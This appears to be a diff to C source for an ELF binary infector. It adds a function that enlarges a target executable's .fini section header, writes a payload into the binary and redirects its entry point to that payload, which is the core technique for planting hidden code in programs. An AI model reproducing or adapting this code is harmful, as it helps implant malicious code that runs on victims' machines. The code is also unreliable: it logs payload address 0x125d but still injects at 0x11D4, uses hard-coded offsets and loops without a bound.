@@ -222,6 +222,41 @@ int inject_payload(FILE *binary, Elf64_Addr injection_site, uint8_t *payload)
     return 0;
 }
 
+int expand_fini(FILE *binary)
+{
+    int section_header_start = 17280;
+    Elf64_Addr curr_header_start = 0; //where current sh begins
+    Elf64_Shdr curr_header;
+
+    memset(&curr_header, 0, sizeof(curr_header));
+    rewind(binary);
+
+    fseek(binary, section_header_start, SEEK_CUR);
+
+    for (;;)
+    {
+        curr_header_start = ftell(binary);
+        fread(&curr_header, sizeof(Elf64_Shdr), 1, binary);
+        printf("section address: 0x%x\n", curr_header.sh_addr);
+        if (curr_header.sh_addr == 0x401254)
+        {
+            break;
+        }
+    }
+
+    printf("fini address: 0x%x\n", curr_header.sh_addr);
+    curr_header.sh_size += 0x110;
+
+    rewind(binary);
+    fseek(binary, curr_header_start, SEEK_CUR);
+
+    fwrite(&curr_header, sizeof(Elf64_Shdr), 1, binary);
+
+    rewind(binary);
+
+    return 0;
+}
+
 int main(int argc, char *argv[])
 {
     int retval = 0;
@@ -304,7 +339,14 @@ int main(int argc, char *argv[])
         goto cleanup;
     }
 
-    printf("Writing payload to address: 0x%x\n", 0x11D4);
+    retval = expand_fini(binary);
+    if (retval > 0)
+    {
+        puts("Failed to expand ifni section");
+        goto cleanup;
+    }
+
+    printf("Writing payload to address: 0x%x\n", 0x125d);
 
     retval = inject_payload(binary, 0x11D4, payload);
     if (retval > 0)
@@ -313,7 +355,7 @@ int main(int argc, char *argv[])
         goto cleanup;
     }
 
-    retval = swap_entry_point(binary, exe_ph.p_vaddr + 0x1D4);
+    retval = swap_entry_point(binary, exe_ph.p_vaddr + 0x25d);
     if (retval > 0)
     {
         puts("Failed to swap entry point");
